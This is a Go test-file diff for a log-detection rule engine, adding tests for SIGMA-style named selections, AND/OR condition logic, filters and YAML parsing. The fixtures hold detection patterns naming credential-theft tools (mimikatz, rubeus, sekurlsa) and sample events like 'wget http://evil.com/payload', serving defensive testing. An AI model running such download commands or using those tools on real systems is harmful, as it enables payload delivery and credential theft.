@@ -8,6 +8,7 @@ import (
 	"time"
 
 	"github.com/sentinel-agent/sentinel/internal/types"
+	"gopkg.in/yaml.v3"
 )
 
 // ---------------------------------------------------------------------------
@@ -1813,5 +1814,269 @@ response:
 
 	if target := compiled.Actions[0].ResolveTarget(event); target != "1234" {
 		t.Errorf("full pipeline ResolveTarget: got %q, want %q", target, "1234")
+	}
+}
+
+// ===========================================================================
+// 8. Named Selections (SIGMA-style condition groups)
+// ===========================================================================
+
+func TestNamedSelections_ORLogic(t *testing.T) {
+	rule := Rule{
+		ID:       "named-or",
+		Title:    "Named OR Test",
+		Severity: "high",
+		Detection: RuleDetection{
+			Selections: map[string]map[string]interface{}{
+				"selection_a": {"raw|contains": "mimikatz"},
+				"selection_b": {"raw|contains": "powershell"},
+			},
+			Condition: "selection_a or selection_b",
+		},
+	}
+
+	compiled, err := CompileRule(rule)
+	if err != nil {
+		t.Fatalf("CompileRule: %v", err)
+	}
+
+	if len(compiled.ConditionGroups) != 2 {
+		t.Fatalf("expected 2 condition groups, got %d", len(compiled.ConditionGroups))
+	}
+	if compiled.ConditionLogic != "or" {
+		t.Errorf("expected 'or' logic, got %q", compiled.ConditionLogic)
+	}
+
+	event1 := makeEvent(map[string]string{})
+	event1.Raw = "found mimikatz running"
+	if !compiled.Matches(event1) {
+		t.Error("expected match on selection_a (mimikatz)")
+	}
+
+	event2 := makeEvent(map[string]string{})
+	event2.Raw = "powershell -enc abc"
+	if !compiled.Matches(event2) {
+		t.Error("expected match on selection_b (powershell)")
+	}
+
+	event3 := makeEvent(map[string]string{})
+	event3.Raw = "normal event"
+	if compiled.Matches(event3) {
+		t.Error("expected no match on unrelated event")
+	}
+}
+
+func TestNamedSelections_ANDLogic(t *testing.T) {
+	rule := Rule{
+		ID:       "named-and",
+		Title:    "Named AND Test",
+		Severity: "high",
+		Detection: RuleDetection{
+			Selections: map[string]map[string]interface{}{
+				"selection_process": {"raw|contains": "cmd.exe"},
+				"selection_network": {"raw|contains": "http"},
+			},
+			Condition: "selection_process and selection_network",
+		},
+	}
+
+	compiled, err := CompileRule(rule)
+	if err != nil {
+		t.Fatalf("CompileRule: %v", err)
+	}
+
+	if compiled.ConditionLogic != "and" {
+		t.Errorf("expected 'and' logic, got %q", compiled.ConditionLogic)
+	}
+
+	event1 := makeEvent(map[string]string{})
+	event1.Raw = "cmd.exe downloading http://evil.com"
+	if !compiled.Matches(event1) {
+		t.Error("expected match when both selections are present")
+	}
+
+	event2 := makeEvent(map[string]string{})
+	event2.Raw = "cmd.exe running locally"
+	if compiled.Matches(event2) {
+		t.Error("expected no match when only one AND selection matches")
+	}
+}
+
+func TestNamedSelections_MultipleConditionsPerGroup(t *testing.T) {
+	rule := Rule{
+		ID:       "named-multi",
+		Title:    "Multi-condition Group",
+		Severity: "medium",
+		Detection: RuleDetection{
+			Selections: map[string]map[string]interface{}{
+				"selection_attack": {
+					"raw|contains":          "wget",
+					"command_line|contains": "http",
+				},
+			},
+			Condition: "selection_attack",
+		},
+	}
+
+	compiled, err := CompileRule(rule)
+	if err != nil {
+		t.Fatalf("CompileRule: %v", err)
+	}
+
+	event1 := makeEvent(map[string]string{
+		"command_line": "wget http://evil.com/payload",
+	})
+	event1.Raw = "wget http://evil.com/payload"
+	if !compiled.Matches(event1) {
+		t.Error("expected match when all conditions in group match")
+	}
+
+	event2 := makeEvent(map[string]string{
+		"command_line": "ls -la",
+	})
+	event2.Raw = "wget some-file-locally"
+	if compiled.Matches(event2) {
+		t.Error("expected no match when only raw matches but command_line doesn't")
+	}
+}
+
+func TestNamedSelections_WithFilter(t *testing.T) {
+	rule := Rule{
+		ID:       "named-filter",
+		Title:    "Named With Filter",
+		Severity: "high",
+		Detection: RuleDetection{
+			Selections: map[string]map[string]interface{}{
+				"selection_main": {"raw|contains": "suspicious"},
+			},
+			Filter:    map[string]interface{}{"username": "admin"},
+			Condition: "selection_main and not filter",
+		},
+	}
+
+	compiled, err := CompileRule(rule)
+	if err != nil {
+		t.Fatalf("CompileRule: %v", err)
+	}
+
+	event1 := makeEvent(map[string]string{"username": "attacker"})
+	event1.Raw = "suspicious activity detected"
+	if !compiled.Matches(event1) {
+		t.Error("expected match without filter exclusion")
+	}
+
+	event2 := makeEvent(map[string]string{"username": "admin"})
+	event2.Raw = "suspicious activity detected"
+	if compiled.Matches(event2) {
+		t.Error("expected no match: filter should exclude admin")
+	}
+}
+
+func TestNamedSelections_YAMLUnmarshal(t *testing.T) {
+	yamlData := `
+selection_tools:
+  raw|contains:
+    - mimikatz
+    - rubeus
+selection_commands:
+  command_line|contains:
+    - sekurlsa
+condition: selection_tools or selection_commands
+`
+	var det RuleDetection
+	if err := yaml.Unmarshal([]byte(yamlData), &det); err != nil {
+		t.Fatalf("YAML unmarshal: %v", err)
+	}
+
+	if len(det.Selections) != 2 {
+		t.Fatalf("expected 2 named selections, got %d", len(det.Selections))
+	}
+	if _, ok := det.Selections["selection_tools"]; !ok {
+		t.Error("missing selection_tools")
+	}
+	if _, ok := det.Selections["selection_commands"]; !ok {
+		t.Error("missing selection_commands")
+	}
+	if det.Condition != "selection_tools or selection_commands" {
+		t.Errorf("unexpected condition: %q", det.Condition)
+	}
+}
+
+func TestNamedSelections_BackwardCompatible(t *testing.T) {
+	rule := Rule{
+		ID:       "simple-compat",
+		Title:    "Simple Selection",
+		Severity: "low",
+		Detection: RuleDetection{
+			Selection: map[string]interface{}{"raw|contains": "error"},
+		},
+	}
+
+	compiled, err := CompileRule(rule)
+	if err != nil {
+		t.Fatalf("CompileRule: %v", err)
+	}
+
+	if len(compiled.Conditions) != 1 {
+		t.Fatalf("expected 1 simple condition, got %d", len(compiled.Conditions))
+	}
+	if len(compiled.ConditionGroups) != 0 {
+		t.Errorf("expected no condition groups for simple selection, got %d", len(compiled.ConditionGroups))
+	}
+
+	event := makeEvent(map[string]string{})
+	event.Raw = "an error occurred"
+	if !compiled.Matches(event) {
+		t.Error("expected backward-compatible match")
+	}
+}
+
+func TestMatchGroup_HelperFunction(t *testing.T) {
+	group := []Condition{
+		{Field: "raw", Operator: OpContains, Value: "test"},
+		{Field: "username", Operator: OpEquals, Value: "admin"},
+	}
+
+	event := types.LogEvent{
+		Raw:    "test event",
+		Fields: map[string]string{"username": "admin"},
+	}
+
+	if !matchGroup(group, event) {
+		t.Error("expected group to match when all conditions are met")
+	}
+
+	event2 := types.LogEvent{
+		Raw:    "test event",
+		Fields: map[string]string{"username": "user"},
+	}
+	if matchGroup(group, event2) {
+		t.Error("expected group to not match when username differs")
+	}
+
+	if matchGroup(nil, event) {
+		t.Error("expected empty group to not match")
+	}
+}
+
+func TestParseConditionLogic(t *testing.T) {
+	tests := []struct {
+		condition string
+		expected  string
+	}{
+		{"selection_a or selection_b", "or"},
+		{"selection_a and selection_b", "and"},
+		{"selection_a or selection_b or selection_c", "or"},
+		{"selection_main and not filter", "and"},
+		{"selection_a", "or"},
+		{"", "or"},
+		{"selection_a or selection_b and not filter", "or"},
+	}
+
+	for _, tc := range tests {
+		got := parseConditionLogic(tc.condition)
+		if got != tc.expected {
+			t.Errorf("parseConditionLogic(%q) = %q, want %q", tc.condition, got, tc.expected)
+		}
 	}
 }
